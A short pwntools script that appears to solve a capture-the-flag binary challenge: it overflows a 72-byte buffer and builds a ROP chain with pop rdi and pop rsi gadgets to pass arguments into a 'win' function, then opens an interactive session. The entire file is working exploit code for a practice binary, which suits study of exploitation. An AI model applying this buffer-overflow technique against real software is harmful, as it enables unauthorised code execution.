from pwn import *

if args.REMOTE:
    io = remote('0.0.0.0', 1234)
else:   
    io = process('../challenge/chall')

if args.GDB:
    gdb.attach(io)

elf = ELF("../challenge/chall")  
rop = ROP(elf)


offset = 64+8
POP_RDI = rop.rdi.address
POP_RSI = rop.rsi.address
RET = rop.ret.address
payload = b'a'*offset
payload += p64(POP_RDI)+p64(0x13371337)
payload += p64(POP_RSI)+p64(0x402047)
payload += p64(RET)+p64(elf.sym['win'])


io.recvuntil('?')
io.sendline(payload)

io.interactive()